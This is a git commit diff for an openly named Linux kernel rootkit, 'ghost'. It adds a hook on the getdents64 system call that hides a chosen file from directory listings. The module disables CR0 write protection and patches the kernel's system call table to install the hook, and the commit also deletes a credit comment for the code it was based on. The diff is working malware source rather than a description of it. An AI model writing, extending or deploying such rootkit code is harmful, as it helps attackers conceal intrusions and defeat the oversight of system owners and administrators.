4ab339a938f88978a4dfa7c608b6bed89840ff10
Ch4r0nN λ <82242552+Ch4r0nN@users.noreply.github.com>
2024-06-06 16:24:59 -0300

    Hotfix #2

--- src/prototype.c
+++ src/prototype.c
@@ -7,21 +7,17 @@
 #include <linux/syscalls.h>
 #include <linux/kprobes.h>
 #include <asm/paravirt.h>
+#include <linux/uaccess.h>
 #include "include/ghost.h"
 
 MODULE_AUTHOR("Ch4r0nN");
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.0.0.3");
 
-
-
-// disabling the protected mode of cr0
-
 static inline void write_cr0_forced(unsigned long value)
 {
     asm volatile("mov %0, %%cr0" : "+r"(value), "+m"(__force_order));
 }
-
 
 static inline void protect_memory(void)
 {
@@ -32,13 +28,6 @@ static inline void unprotect_memory(void)
 {
     write_cr0_forced(cr0 & ~0x00010000);
 }
-
- /* Copyright © xcellerator
- *  thanks for making this wonderful Linux_Kernel_Hacking repo that inspired and based this rootkit
- *  Acknowledgment by: Ch4r0nN
- *  Link of repo: https://github.com/xcellerator/linux_kernel_hacking
- *  In this function we use kallsyms_lockup_name to find the memory address in the kernel
- */
 
 unsigned long *
 find_syscall_table(void)
@@ -56,7 +45,40 @@ find_syscall_table(void)
     __syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 
     return __syscall_table;
+}
 
+asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
+
+asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    int ret = orig_getdents64(fd, dirp, count);
+    struct linux_dirent64 *d, *kd, *kdirent = NULL;
+    unsigned long offset = 0;
+
+    if (ret <= 0)
+        return ret;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (kdirent == NULL)
+        return ret;
+
+    if (copy_from_user(kdirent, dirp, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    while (offset < ret) {
+        d = (struct linux_dirent64 *)((char *)kdirent + offset);
+        if (strcmp(d->d_name, "file_to_hide") == 0) {
+            memmove(d, (char *)d + d->d_reclen, ret - offset - d->d_reclen);
+            ret -= d->d_reclen;
+        } else {
+            offset += d->d_reclen;
+        }
+    }
+
+    copy_to_user(dirp, kdirent, ret);
+    kfree(kdirent);
+    return ret;
 }
 
 static int __init ghost_init(void)
@@ -68,13 +90,24 @@ static int __init ghost_init(void)
         return -1;
     }
 
+    cr0 = read_cr0();
+    orig_getdents64 = (void *)__syscall_table[__NR_getdents];
+    unprotect_memory();
+    __syscall_table[__NR_getdents] = (unsigned long)hook_getdents64;
+    protect_memory();
+
+    printk(KERN_INFO "Rootkit loaded: Syscall hooked\n");
     return 0;
 }
 
-
 static void __exit ghost_exit(void)
 {
+    unprotect_memory();
+    __syscall_table[__NR_getdents] = (unsigned long)orig_getdents64;
+    protect_memory();
 
+    printk(KERN_INFO "Rootkit unloaded: Syscall restored\n");
 }
+
 module_init(ghost_init);
 module_exit(ghost_exit);
